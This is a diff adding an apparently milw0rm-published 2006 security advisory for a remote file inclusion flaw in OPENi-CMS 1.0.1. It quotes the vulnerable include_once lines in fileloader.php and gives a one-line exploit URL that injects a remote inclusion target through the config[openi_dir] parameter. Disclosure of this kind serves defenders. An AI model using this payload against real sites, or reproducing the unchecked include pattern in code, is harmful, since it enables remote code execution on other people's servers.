@@ -1,0 +1,43 @@
+Update:
+22:44 09/11/06
+
+Subject:
+"OPENi-CMS 1.0.1(config) Remote File Inclusion Vulnerability "
+
+Vulnerable version:
+OPENi-CMS 1.0.1
+
+Operating System:
+- All OS
+
+Vendor URL:
+Support - support@openi-cms.org
+Website - http://www.openi-cms.org/
+
+Description:
+Openi-CMS he one software PHP Content Management System with facilities 
+wysiwyg the editor, plugin, user management to facilitate arranged as 
+well as the difference style website 
+
+
+Vulnerability:
+Invalid include function at fileloader.php on line at 5,6 and 7,the 
+'$config["openi_dir"]' is not gurantee to including a files. 
+
+// openi-admin/base/fileloader.php
+
+include_once($config["openi_dir"]."/base/constants.php"); // invalid code
+include_once($config["openi_dir"]."/base/db_classes.php"); // invalid code
+include_once($config["openi_dir"]."/base/site_classes.php"); // invalid code
+
+Exploit:
+http://[url]/[path]/openi-admin/base/fileloader.php?config[openi_dir]=[url_inclusion_exploit]
+
+Solution:
+upgrade next version
+
+Published by:
+basher13 (Infam0us Gr0up - Securiti Research)
+basher13@linuxmail.org / www.xcrime-cyber.pro.tc
+
+# milw0rm.com [2006-09-11]
